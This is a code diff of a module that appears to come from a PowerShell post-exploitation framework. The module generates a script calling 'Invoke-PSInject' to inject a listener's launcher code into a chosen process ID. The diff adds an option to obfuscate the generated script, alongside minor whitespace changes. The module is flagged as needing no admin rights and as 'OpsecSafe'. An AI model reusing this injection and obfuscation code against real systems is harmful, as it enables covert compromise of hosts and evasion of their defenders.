@@ -17,13 +17,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://sixdub.net'
             ]
@@ -76,7 +76,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
         procID = self.options['ProcId']['Value']
@@ -138,5 +138,11 @@ class Module:
             else:
                 launcherCode = launcher.split(" ")[-1]
 
-                script += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)            
+                script += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)
+                if obfuscate:
+                    script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+
                 return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        return
